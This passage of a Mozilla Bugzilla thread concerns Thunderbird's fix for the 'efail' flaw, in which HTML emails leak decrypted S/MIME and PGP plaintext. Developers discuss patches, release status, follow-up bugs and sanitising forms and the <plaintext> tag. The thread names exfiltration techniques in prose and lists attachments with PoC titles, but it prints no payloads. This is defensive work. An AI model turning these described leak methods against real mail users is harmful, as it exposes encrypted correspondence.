          <div class="change-time"><span class="rel-time" title="2018-05-23 09:55 PDT" data-time="1527094524">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-202">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979997"
         class="attachment"
         data-id="8979997" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="smime-reply-exfiltration.eml">
      <meta itemprop="contentSize" content="1407">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8979997" itemprop="contentUrl">
        <span id="att-8979997-description" itemprop="description">S/MIME Reply Exfiltration</span></a>
        — <a href="attachment.cgi?id=8979997&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c203"><div class="comment" data-id="13299998" data-no="203"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-203" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15756451_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-203"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-203" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c203">Comment 203</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 09:55 PDT" data-time="1527094547">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-203">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979998"
         class="attachment"
         data-id="8979998" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="smime-reply-exfiltration.png">
      <meta itemprop="contentSize" content="61711">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8979998" itemprop="contentUrl">
        <span id="att-8979998-description" itemprop="description">S/MIME Reply Exfiltration (Screenshot)</span></a>
        — <a href="attachment.cgi?id=8979998&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c204"><div class="comment" data-id="13300190" data-no="204"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-204" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15756451_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-204"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-204" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c204">Comment 204</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 11:02 PDT" data-time="1527098558">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-204">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-204" data-comment-id="13300190">I'm afraid at comment &gt;200 we're not going to reopen this(*). Please file a follow-up.

(*) Strictly reopening is only when a patch is backed out which is not the case here.</pre><div class="activity"><div class="change">Status: REOPENED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2018-05-21 10:03 PDT" data-time="1526922224">4 years ago</span> &rarr; <span class="rel-time" title="2018-05-23 11:02 PDT" data-time="1527098558">4 years ago</span></div><div class="change">Resolution: --- &rarr; FIXED</div></div></div><div class="change-set" id="c205"><div class="comment" data-id="13300461" data-no="205"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-205" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15756451_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-205"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-205" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c205">Comment 205</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 12:33 PDT" data-time="1527104008">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-205">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-205" data-comment-id="13300461">TB 60 beta 7 (BETA_60_CONTINUATION branch):
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-beta/rev/6ff4b0b96518">https://hg.mozilla.org/releases/comm-beta/rev/6ff4b0b96518</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-beta/rev/1d4a70869ef3">https://hg.mozilla.org/releases/comm-beta/rev/1d4a70869ef3</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-beta/rev/6b09af3c9a3a">https://hg.mozilla.org/releases/comm-beta/rev/6b09af3c9a3a</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_60&amp;o1=isnotempty">status-thunderbird60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c206"><div class="comment" data-id="13300591" data-no="206"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-206" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a15756451_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-206"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-206" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c206">Comment 206</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 13:18 PDT" data-time="1527106682">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-206">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-206" data-comment-id="13300591">Jens, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c201">comment 201</a> relates to Enigmail. Inline-PGP is not handled by TBird at all. I'll take this to the Enigmail bug tracker.</pre></div><div class="change-set" id="c207"><div class="comment" data-id="13341689" data-no="207"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-207" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15756451_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-207"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-207" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c207">Comment 207</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-24 05:06 PDT" data-time="1527163618">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-207">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-207" data-comment-id="13341689">(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c199">comment #199</a>)
<span class="quote">&gt; As far as I can tell, the related preconnect remote content bypass is fixed
&gt; (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block"
   href="/show_bug.cgi?id=1408867">bug 1408867</a>). As well is leaking the plaintext by tricking the user into
&gt; submitting the it via HTML forms (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">Bug 1450345</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field"
   href="/show_bug.cgi?id=1462910">Bug 1462910</a>) or remote images
&gt; (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"
   href="/show_bug.cgi?id=1457721">bug 1457721</a>).</span >

Good. Thanks for verifying!
I'm setting this on VERIFIED FIXED on behalf of Jens.

<span class="quote">&gt; Please note that there may still be bypasses -- in the long term I'd agree
&gt; with what Ben said (<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a>).</span >
...
<span class="quote">&gt; * S/MIME: decrypted MIME parts can be completely hidden with CSS; if user
&gt; replies/forwards in HTML format the (non-visible) plaintext is leaked,</span >

That attacks the composer and is an issue separate from the one that was fixed here.

I actually have a solution for that, and a fix. It's the &quot;Sanitize HTML quotes&quot; patch here. It's already described and covered in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a> point 2.

For the sake of not prolonging this bug which already has over 200 comments, I would suggest to tackle that separate issue in another bug.</pre></div><div class="change-set" id="a15888739_22599"><div class="change" id="aa15888739_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15888739_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15888739_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15888739_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15888739_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15888739_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-24 05:07 PDT" data-time="1527163630">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Status: RESOLVED &rarr; VERIFIED</div></div></div><div class="change-set" id="c208"><div class="comment" data-id="13344662" data-no="208"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-208" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15888739_22599"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15888739_22599"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-208"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-208" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c208">Comment 208</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-24 06:06 PDT" data-time="1527167196">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-208">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-208" data-comment-id="13344662">Filed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward"
   href="/show_bug.cgi?id=1464056">bug 1464056</a> for the reply-or-forward issue</pre></div><div class="change-set" id="a15976802_176914"><div class="change" id="aa15976802_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15976802_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15976802_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15976802_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15976802_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-25 05:34 PDT" data-time="1527251693">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - New HTML processing introduced in bug 1419417 causes badly rendered HTML"
   href="/show_bug.cgi?id=1464391">1464391</a></div></div></div><div class="change-set" id="c209"><div class="comment" data-id="13368962" data-no="209"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-209" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5490" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/0030426a5e04e85c33fe02480bc4ca81?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5490" id="a15976802_176914"><a class="email " href="/user_profile?user_id=5490" > <span class="fna">Henri Sivonen (:hsivonen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-209"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-209" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c209">Comment 209</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-28 05:40 PDT" data-time="1527511234">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-209">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-209" data-comment-id="13368962">Some comments based on viewing code in the commits linked to from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c205">comment 205</a>:

* Assembling the whole document that's displayed by concatenating strings seems more error prone and less efficient than parsing each MIME part into a document fragment (nsIParserUtils::parseFragment()) using &lt;body&gt; as the context node, sanitizing to remove forms, etc., and then appending the resulting fragments into a skeleton document wrapped in the kind of fieldsets (created using the DOM APIs) that are currently produced by injecting source text.

* While it's unlikely in practice for encrypted parts to contain form controls with a form attribute whole value the attacker could guess, it's worthwhile to be aware of <a rel="nofollow" href="https://html.spec.whatwg.org/#attr-fae-form">https://html.spec.whatwg.org/#attr-fae-form</a> . Since it's implausible enough for form submissions to be a legitimate use case in the context of emails that contain encrypted parts, I recommend erring on the side of sanitizing more (setting SanitizerDropForms, etc.) in all MIME parts when there is at least one encrypted MIME part. It's not like you need to show a browser-like newsletter rendering experience for encrypted emails.

* In addition to sanitizing form and form control elements, it would probably be a good idea to block form submissions in the message viewer and message editor docshells.</pre></div><div class="change-set" id="c210"><div class="comment" data-id="13369020" data-no="210"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-210" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15976802_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-210"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-210" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c210">Comment 210</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-28 06:01 PDT" data-time="1527512507">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-210">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-210" data-comment-id="13369020">The last item would be <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field"
   href="/show_bug.cgi?id=1462910">bug 1462910</a> and the ones that went before, like <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">bug 1450345</a>:
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53#l1.31">https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53#l1.31</a></pre></div><div class="change-set" id="c211"><div class="comment" data-id="13397582" data-no="211"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-211" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15976802_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-211"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-211" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c211">Comment 211</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-08 18:09 PDT" data-time="1528506556">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-211">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-211" data-comment-id="13397582">Can we get this released, please?</pre></div><div class="change-set" id="c212"><div class="comment" data-id="13397705" data-no="212"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-212" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15976802_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-212"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-212" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c212">Comment 212</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-08 22:34 PDT" data-time="1528522493">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-212">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-212" data-comment-id="13397705">It's in TB 60 beta 7, released yesterday.</pre></div><div class="change-set" id="c213"><div class="comment" data-id="13397822" data-no="213"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-213" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15976802_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-213"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-213" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c213">Comment 213</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-09 03:47 PDT" data-time="1528541226">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-213">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-213" data-comment-id="13397822">I mean TB 52.8.1. Users are waiting for it since 3 weeks.</pre></div><div class="change-set" id="c214"><div class="comment" data-id="13397825" data-no="214"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-214" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15976802_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-214"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-214" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c214">Comment 214</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-09 04:04 PDT" data-time="1528542258">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-214">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-214" data-comment-id="13397825">While this is a required step, it's essentially useless without <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Suppress &lt;plaintext&gt; in email messages"
   href="/show_bug.cgi?id=1464667">bug 1464667</a>, so we need that too.</pre></div><div class="change-set" id="c215"><div class="comment" data-id="13397854" data-no="215"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-215" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15976802_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-215"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-215" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c215">Comment 215</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-09 04:55 PDT" data-time="1528545323">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-215">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-215" data-comment-id="13397854">... and more importantly <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward"
   href="/show_bug.cgi?id=1464056">bug 1464056</a>, right? Suppressing &lt;plaintext&gt; is one thing, but preventing subordinate parts being decrypted is an approach that will also stop attacks where the decrypted part is hidden by CSS.</pre></div><div class="change-set" id="c216"><div class="comment" data-id="13421479" data-no="216"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-216" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15976802_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15976802_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-216"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-216" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c216">Comment 216</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-23 02:36 PDT" data-time="1529746615">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-216">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-216" data-comment-id="13421479">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c213">comment #213</a>)
